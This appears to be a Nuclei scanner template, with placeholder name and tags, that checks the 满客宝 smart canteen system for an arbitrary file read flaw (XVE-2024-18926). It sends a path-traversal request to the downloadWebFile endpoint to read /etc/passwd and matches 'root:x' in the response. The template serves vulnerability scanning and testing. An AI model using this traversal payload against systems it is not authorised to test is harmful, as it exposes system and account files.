id: styy-downloadWebFile-lfi
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 满客宝智慧食堂系统downloadWebFile存在任意文件读取漏洞(XVE-2024-18926)
  reference:
    - https://
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=a&ossKey=/../../../../../../../../../../../etc/passwd"

    matchers:
      - type: word
        part: body
        words:
          - 'root:x'
